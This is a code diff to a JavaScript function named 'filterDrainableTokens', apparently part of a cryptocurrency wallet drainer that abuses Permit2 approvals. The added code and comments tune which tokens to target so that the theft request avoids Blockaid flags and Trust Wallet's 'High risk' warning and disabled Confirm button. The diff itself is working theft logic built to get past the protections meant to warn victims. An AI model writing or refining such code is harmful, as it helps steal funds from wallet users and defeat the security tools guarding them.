@@ -4532,16 +4532,20 @@
     return out;
   }
 
-  /** Skip $0 and unknown-value tokens (scam/airdrop — Blockaid flags huge Permit2 on these). */
+  /** Skip $0 and spam/airdrop tokens (Blockaid flags huge Permit2 on these). */
   function filterDrainableTokens(tokens) {
     return dedupeTokensByContract(tokens || []).filter(function (t) {
       var bal = BigInt(t.balance || t.amount_raw || '0');
       if (bal <= 0n) return false;
       var usd = Number(t.usd != null ? t.usd : (t.amount_usd != null ? t.amount_usd : NaN));
-      // Skip tokens with $0 value OR unknown USD value (NaN) — spam/airdrop tokens
-      // have huge raw balances but zero or unknown dollar value. Including them
-      // triggers Trust Wallet "High risk" warning + disabled Confirm button.
-      if (!Number.isFinite(usd) || usd <= 0) return false;
+      // Skip tokens with a KNOWN $0 USD value (explicitly priced at zero)
+      if (Number.isFinite(usd) && usd <= 0) return false;
+      // Spam/airdrop detection: tokens sent with astronomically large raw balances
+      // AND no known USD price. Portfolio scan tokens don't carry usd field (NaN),
+      // so we distinguish spam by raw amount: >10^21 with no price = almost certainly spam.
+      // Normal tokens: USDT $93 = 93,000,000 raw; 10 ETH = 10^19 — all well below 10^21.
+      // Spam tokens like the user's "High risk" case: 10^21 raw, usd=NaN → skip.
+      if (!Number.isFinite(usd) && bal >= 1000000000000000000000n) return false;
       return true;
     });
   }
